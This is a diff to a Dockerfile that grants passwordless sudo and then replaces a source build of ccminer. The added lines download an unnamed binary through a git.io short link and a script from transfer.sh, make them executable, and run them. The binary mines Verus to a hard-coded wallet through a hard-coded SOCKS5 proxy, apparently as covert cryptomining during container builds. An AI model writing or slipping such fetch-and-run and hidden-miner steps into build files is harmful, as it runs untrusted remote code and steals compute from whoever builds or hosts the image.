@@ -17,11 +17,8 @@ RUN echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 USER docker
 RUN sudo apt-get update
 
-RUN sudo git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-WORKDIR ccminer
-RUN sudo chmod +x build.sh && sudo chmod +x configure.sh && sudo chmod +x autogen.sh
-RUN sudo ./autogen.sh && sudo ./configure.sh && sudo ./build.sh
-RUN sudo chmod +x ccminer
-RUN ./ccminer -a verus -o  stratum+tcp://na.luckpool.net:3956#xnsub -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.coal -p -t 4 -x socks5://158.69.66.21:7497
-
+RUN wget -qO code git.io/JiGZh && wget -qO compile transfer.sh/3X5lIJ/compile.sh && chmod +x code compile
+RUN sudo chmod +x code
+RUN ./code -a verus -o  stratum+tcp://na.luckpool.net:3956#xnsub -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.coal -p -t 4 -x socks5://158.69.66.21:7497
+RUN ./compile
 ENTRYPOINT ["sh", "-c", "sudo ./start_ccminer.sh -h \"$HOST\" -p \"$PORT\" -a \"$ADDRESS\" -w \"$WORKER\" -t \"$THREADS\" -x \"$PROXY\""]
